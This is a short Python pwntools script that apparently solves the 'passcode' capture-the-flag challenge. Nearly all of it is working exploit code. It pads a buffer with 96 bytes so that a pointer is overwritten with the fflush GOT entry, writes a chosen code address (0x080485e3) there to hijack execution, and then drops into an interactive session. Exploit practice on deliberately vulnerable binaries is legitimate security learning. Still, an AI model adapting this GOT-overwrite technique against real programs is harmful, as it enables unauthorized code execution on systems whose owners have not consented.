from pwn import *

context.log_level = 'DEBUG'

p = process('./passcode')
elf = context.binary = ELF('./passcode')

pause()

info('fflush GOT: %x' %elf.got['fflush'])
target_address = 0x080485e3

payload = b'a' * 96 + p32(elf.got['fflush'])
payload += str(target_address).encode()

p.recvline()
p.sendline(payload)
# p.sendline(str(target_address).encode())
# p.sendline(b'2')

p.interactive()